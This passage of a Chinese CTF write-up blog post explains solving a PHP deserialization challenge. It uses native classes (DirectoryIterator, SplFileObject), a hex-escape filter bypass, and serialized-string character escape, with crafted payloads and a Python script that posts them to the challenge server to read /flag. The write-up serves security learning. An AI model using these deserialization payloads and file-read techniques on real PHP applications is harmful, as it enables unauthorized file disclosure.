<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo new $this-&gt;class($this-&gt;data);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure>
<p>此时心里大概有了点思路，可以利用原生类来解题；此时可以令class&#x3D;”DirectoryIterator”data&#x3D;”&#x2F;“来看看文件；继续往下看；发现参数$cata若是通过过滤，便会将我们的$cata参数反序列化；此时我们可以开始构造我们的exp<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/28.png"><br>此时已经发现存在flag这个文件<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/27.png"><br>此时我们需要再次利用原生类的SplFileObject类进行一个文件读取；但是这里需要注意的是我们的过滤不允许我们的class参数存在大小写的object；此时我们便需要考虑绕过；此时我们可以利用序列化的一个小trick；当我们使用大写的S时；便可以使用十六进制编码Object进行绕过</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原理:当我们把s改成大写的S时候，字符串中的字符是可以使用反斜杠\加16进制替换的。大写O的16进制为4f，小写o的16进制为6f。大小写都可以绕过，因为php类名可以不区分大小写。</span><br></pre></td></tr></table></div></figure>
<p>所以此时开始构造我们的exp和payload<br>exp:<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/30.png"><br>payload:(此时的payload记得经过十六进制的替换 O -&gt; \4f)</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;S:13:&quot;SplFile\4fbject&quot;;s:4:&quot;data&quot;;s:5:&quot;/flag&quot;;&#125;</span><br></pre></td></tr></table></div></figure>
<p>解法二之字符逃逸(此时的字符逃逸又分为两种：扩张和收缩)：<br>此时继续审计我们的源码将重点放在escape这个类中；此时发现一个自定义的abscond方法；这个方法是从$string中寻找$filter并且做一个替换；此时发现在这个替换中；若是匹配到一个NSS便会使得三个字符的逃逸；若是匹配到hello便会使得一个字符的逃逸；此时我们继续往下看；将重心放在下面的这一段代码中<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/31.png"><br>此时先对我们输入的参数检查是否为空；接下来进行一个正则匹配看看我们传入的$email参数是否存在flag这个字符串；有的话则输出”nonono”;若是没有匹配到的话则继续创立一个对象$abscond来初始化escape；然后在继续将$abscond进序列化；并且对我们序列化之后的$escape进行一些字符的修改；然后检查$phone这个参数是否为数组；若是为数组的化则利用file_get_encode函数输出指定的文件并将该文件内容进行base64的编码<br>所以此时我们先新建一个类对象来构造我们的payload；此时需要注意该类中的$phone必须是数组；并且$email的内容是我们要读取的内容</p>
<p>(1)字符逃逸之扩张：对于扩张的话就把后面那一部分放进name的值里，然后再通过字符扩充挤出去</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;escape&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;OTL&quot;;s:5:&quot;phone&quot;;a:1:&#123;i:0;s:6:&quot;123666&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</span><br></pre></td></tr></table></div></figure>
<p>此时我们需要使其逃逸的paylaod为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:5:&quot;phone&quot;;a:1:&#123;i:0;s:6:&quot;123666&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</span><br></pre></td></tr></table></div></figure>
<p>此时计算了一下长度发现是62;用‘NSS’，‘CTF’，‘hello’都可以，前两个是+3，hello是+1，所以这里我用20个NSS和一个hello来扩展<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/32.png"><br>最后的payload即为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=O:6:&quot;escape&quot;:3:&#123;s:4:&quot;name&quot;;s:132:&quot;NSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSShellohello&quot;;s:5:&quot;phone&quot;;a:1:&#123;i:0;s:6:&quot;123666&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;&amp;phone=array(&#x27;123666&#x27;)&amp;email=1</span><br></pre></td></tr></table></div></figure>
<p>部分exp:<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/33.png"><br>当然也可以通过脚本来做</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">print(&quot;NSS&quot;*20+&quot;hello*2&quot;)</span><br><span class="line">url=&quot;http://node4.anna.nssctf.cn:28452/?cata=1&quot;</span><br><span class="line">data=&#123;&quot;name&quot;:&#x27;O:6:&quot;escape&quot;:3:&#123;s:4:&quot;name&quot;;s:132:&quot;NSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSShellohello&quot;;s:5:&quot;phone&quot;;a:1:&#123;i:0;s:6:&quot;123666&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;&quot;;s:5:&quot;phone&quot;;a:1:&#123;i:0;s:6:&quot;123666&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;&#x27;,</span><br><span class="line">      &quot;phone[]&quot;:&quot;123666&quot;,&quot;email&quot;:&quot;1&quot;&#125;</span><br><span class="line">resp=requests.post(url=url,data=data)</span><br><span class="line">print(base64.b64decode(resp.text).decode())</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/35.png"><br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/34.png"></p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="https://hyggevv.github.io">hey</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/">https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">2023鲲鹏杯团队wp</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/04/17/OWASP-top10/"><span class="paginator-prev__text">初探OWASP TOP10</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E4%B9%8B%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">1.</span> <span class="toc-text">
          一、PHP原生类之文件操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">
          1.遍历文件目录类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-DirectoryIterator%E7%B1%BB%EF%BC%9A%E8%BF%99%E4%B8%AA%E7%B1%BB%E4%BC%9A%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95%E7%9A%84%E8%BF%AD%E4%BB%A3%E5%99%A8%EF%BC%8C%E5%BD%93%E9%81%87%E5%88%B0echo%E8%BE%93%E5%87%BA%E6%97%B6%E4%BC%9A%E8%A7%A6%E5%8F%91Directorylterator%E4%B8%AD%E7%9A%84toString-%E6%96%B9%E6%B3%95%EF%BC%8C%E8%BE%93%E5%87%BA%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95%E9%87%8C%E9%9D%A2%E7%BB%8F%E8%BF%87%E6%8E%92%E5%BA%8F%E4%B9%8B%E5%90%8E%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E5%90%8D%E3%80%82%E6%B5%8B%E4%BC%BC%E4%BB%A3%E7%A0%81-2-FilesystemIterator%E7%B1%BB-FilesystemIterator%E7%B1%BB%E4%B8%8EDirectoryIterator%E7%B1%BB%E7%9B%B8%E5%90%8C%EF%BC%8C%E6%8F%90%E4%BE%9B%E4%BA%86%E4%B8%80%E4%B8%AA%E7%94%A8%E4%BA%8E%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9B%AE%E5%BD%95%E5%86%85%E5%AE%B9%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A5%E5%8F%A3%E3%80%82%E8%AF%A5%E7%B1%BB%E7%9A%84%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E5%B0%86%E4%BC%9A%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95%E7%9A%84%E8%BF%AD%E4%BB%A3%E5%99%A8-%E8%AF%A5%E7%B1%BB%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E4%B8%8EDirectoryIterator%E7%B1%BB%E4%B9%9F%E6%98%AF%E5%9F%BA%E6%9C%AC%E7%9B%B8%E5%90%8C%E7%9A%84-%E4%BD%86%E6%98%AF%E8%BF%99%E4%B8%AA%E7%B1%BB%E7%9A%84toString%E4%BC%9A%E4%BB%A5%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E6%98%BE%E7%A4%BA%E6%96%87%E4%BB%B6%E5%90%8D%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81-3-GlobIterator%E7%B1%BB%E4%B8%8E%E5%89%8D%E4%B8%A4%E4%B8%AA%E7%B1%BB%E7%9A%84%E4%BD%9C%E7%94%A8%E7%9B%B8%E4%BC%BC-GlobIterator%E7%B1%BB%E4%B9%9F%E5%8F%AF%E4%BB%A5%E9%81%8D%E5%8E%86%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%EF%BC%8C%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E4%B8%8E%E5%89%8D%E4%B8%A4%E4%B8%AA%E7%B1%BB%E4%B9%9F%E5%9F%BA%E6%9C%AC%E7%9B%B8%E4%BC%BC%E3%80%82%E4%BD%86%E4%B8%8E%E4%B8%8A%E9%9D%A2%E7%95%A5%E4%B8%8D%E5%90%8C%E7%9A%84%E6%98%AF%E5%85%B6%E8%A1%8C%E4%B8%BA%E7%B1%BB%E4%BC%BC%E4%BA%8E-glob-%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E6%9D%A5%E5%AF%BB%E6%89%BE%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E3%80%82%E5%85%B6%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E5%88%9B%E5%BB%BA%E7%9A%84%E6%98%AF%E4%B8%80%E4%B8%AA%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95%E7%9A%84%E8%BF%AD%E4%BB%A3%E5%99%A8%EF%BC%8C%E5%BD%93%E6%88%91%E4%BB%AC%E4%BD%BF%E7%94%A8echo%E5%87%BD%E6%95%B0%E8%BE%93%E5%87%BA%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E4%BC%9A%E8%A7%A6%E5%8F%91%E8%BF%99%E4%B8%A4%E4%B8%AA%E7%B1%BB%E4%B8%AD%E7%9A%84toString-%E6%96%B9%E6%B3%95%EF%BC%8C%E8%BE%93%E5%87%BA%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95%E9%87%8C%E9%9D%A2%E7%89%B9%E5%AE%9A%E6%8E%92%E5%BA%8F%E4%B9%8B%E5%90%8E%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E5%90%8D%E3%80%82%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4%E5%A6%82%E6%9E%9C%E6%88%91%E4%BB%AC%E4%B8%8D%E5%BE%AA%E7%8E%AF%E9%81%8D%E5%8E%86%E7%9A%84%E8%AF%9D%E6%98%AF%E4%B8%8D%E8%83%BD%E7%9C%8B%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95%E9%87%8C%E7%9A%84%E5%85%A8%E9%83%A8%E6%96%87%E4%BB%B6%E7%9A%84%EF%BC%8C%E8%80%8C-GlobIterator-%E7%B1%BB%E4%BE%BF%E5%8F%AF%E4%BB%A5%E5%B8%AE%E6%88%91%E4%BB%AC%E5%9C%A8%E4%B8%80%E5%AE%9A%E7%A8%8B%E5%BA%A6%E4%B8%8A%E8%A7%A3%E5%86%B3%E4%BA%86%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98%E3%80%82%E7%94%B1%E4%BA%8E-GlobIterator-%E7%B1%BB%E6%94%AF%E6%8C%81%E7%9B%B4%E6%8E%A5%E9%80%9A%E8%BF%87%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E6%9D%A5%E5%AF%BB%E6%89%BE%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4%E5%81%87%E8%AE%BE%E6%88%91%E4%BB%AC%E7%9F%A5%E9%81%93%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E5%90%8D%E7%9A%84%E4%B8%80%E9%83%A8%E5%88%86%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E8%AF%A5%E7%B1%BB%E7%9A%84%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E6%89%BE%E5%88%B0%E5%85%B6%E5%AE%8C%E6%95%B4%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D%E3%80%82%E4%BE%8B%E5%A6%82%EF%BC%8C%E6%88%91%E4%BB%AC%E5%9C%A8CTF%E4%B8%AD%E7%9F%A5%E9%81%93flag%E5%9C%A8%E6%A0%B9%E7%9B%AE%E5%BD%95%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E4%BB%AC%E4%B8%8D%E7%9F%A5%E9%81%93flag%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%8C%E6%95%B4%E6%96%87%E4%BB%B6%E5%90%8D%EF%BC%8C%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E7%B1%BB%E4%BC%BC-GlobIterator-x2F-flag-%EF%BC%9A%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%812-%E4%BD%BF%E7%94%A8%E5%8F%AF%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95%E7%B1%BB%E7%BB%95%E8%BF%87-open-basedir"><span class="toc-number">3.</span> <span class="toc-text">
          (1)DirectoryIterator类：这个类会创建一个指定目录的迭代器，当遇到echo输出时会触发Directorylterator中的toString()方法，输出指定目录里面经过排序之后的第一个文件名。123&lt;1&gt;版本:PHP 5, PHP 7, PHP 8&lt;2&gt;用法:$dir &#x3D; new DirectoryIterator(dirname(__FILE__));得到的这个$dir对象，就是__FILE__所在目录下的所有文件和子文件夹的一个综合体，每一个项目对应对象的一个属性测似代码:12345678910111213141516171819&lt;?php$dir&#x3D;new DirectoryIterator(&quot;&#x2F;&quot;);echo $dir;?&gt;如果想输出全部的文件名我们还需要对$dir对象进行遍历:&lt;?php$dir&#x3D;new DirectoryIterator(&quot;&#x2F;&quot;);foreach($dir as $f){    echo($f.&#39;&lt;br&gt;&#39;);    &#x2F;&#x2F;echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);}?&gt;也可以配合glob:&#x2F;&#x2F;协议使用模式匹配来寻找我们想要的文件路径：&lt;?php$dir&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*php*&quot;);echo $dir;?&gt;(2)FilesystemIterator类:12&lt;1&gt;版本:PHP 5 &gt;&#x3D; 5.1.0, PHP 7, PHP 8&lt;2&gt;用法:$context &#x3D; new SplFileObject(&#39;文件路径&#39;);FilesystemIterator类与DirectoryIterator类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器.该类的使用方法与DirectoryIterator类也是基本相同的;但是这个类的toString会以绝对路径显示文件名测试代码12345678910111213141516171819&lt;?php$dir&#x3D;new FilesystemIterator(&quot;&#x2F;&quot;);echo $dir;?&gt;如果想输出全部的文件名我们还需要对$dir对象进行遍历:&lt;?php$dir&#x3D;new FilesystemIterator(&quot;&#x2F;&quot;);foreach($dir as $f){    echo($f.&#39;&lt;br&gt;&#39;);    &#x2F;&#x2F;echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);}?&gt;也可以配合glob:&#x2F;&#x2F;协议使用模式匹配来寻找我们想要的文件路径：&lt;?php$dir&#x3D;new FilesystemIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*php*&quot;);echo $dir;?&gt;(3)GlobIterator类12&lt;1&gt;版本:PHP 5 &gt;&#x3D; 5.3.0, PHP 7, PHP 8&lt;2&gt;用法:$dir&#x3D;new Globlterator(文件路径);与前两个类的作用相似,GlobIterator类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob(),可以通过模式匹配来寻找文件路径。其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的toString()方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而 GlobIterator 类便可以帮我们在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如，我们在CTF中知道flag在根目录，但是我们不知道flag文件的完整文件名，我们就可以通过类似 GlobIterator(&#x2F;flag)：测试代码1234&lt;?php$dir&#x3D;new GlobIterator(&quot;f*.*&quot;);echo $dir;?&gt;2.使用可遍历目录类绕过 open_basedir</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%8F%AF%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%B1%BB"><span class="toc-number">4.</span> <span class="toc-text">
          3.可读取文件类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E4%B9%8B%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E5%92%8C%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E7%9A%84%E9%85%8D%E5%90%88%E4%BD%BF%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">
          4.PHP原生类之遍历文件和文件读取的配合使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-number">6.</span> <span class="toc-text">
          二、PHP反序列化之字符逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E7%B1%BB%E9%A2%98%E7%9B%AE%E7%9A%84%E7%89%B9%E7%82%B9%EF%BC%9A"><span class="toc-number">7.</span> <span class="toc-text">
          1.字符逃逸的原理和字符串逃逸类题目的特点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E4%B9%8B%E6%9B%BF%E6%8D%A2%E4%BF%AE%E6%94%B9%E5%90%8E%E5%AF%BC%E8%87%B4%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E9%95%BF"><span class="toc-number">8.</span> <span class="toc-text">
          2.字符逃逸之替换修改后导致序列化字符串变长</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E4%B9%8B%E6%9B%BF%E6%8D%A2%E4%B9%8B%E5%90%8E%E5%AF%BC%E8%87%B4%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E7%9F%AD"><span class="toc-number">9.</span> <span class="toc-text">
          字符逃逸之替换之后导致序列化字符串变短</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#prize-p5"><span class="toc-number">10.</span> <span class="toc-text">
          prize_p5</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/usually.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hey</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">111</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2025</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>hey</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.2</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.7.0</span></div><div class="busuanzi"><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">Views</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.7.0"></script><script src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":180,"height":300},"mobile":{"show":true},"log":false});</script></body></html>